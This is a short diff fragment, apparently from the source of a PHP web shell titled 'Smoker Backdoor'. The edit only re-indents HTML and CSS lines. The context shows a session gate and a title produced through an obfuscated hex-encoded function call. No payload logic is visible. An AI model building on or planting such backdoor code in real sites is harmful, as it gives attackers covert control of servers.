@@ -16,7 +16,7 @@ if (empty($_SESSION['enter'])) { ?>
 
 	<head>
 		<title><?php echo "\x73\x6d\x6f\x6b\x65"("536d6f6b6572204261636b646f6f72"); ?></title>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 		<link rel="icon" href="https://sendeyo.com/up/d/b812e98fc2">
 		<style>
 			html {
@@ -27,7 +27,7 @@ if (empty($_SESSION['enter'])) { ?>
 				background-position: center;
 				background-attachment: fixed;
 				color: white;
-                text-align: center;
+                		text-align: center;
 			}
 
 			input {
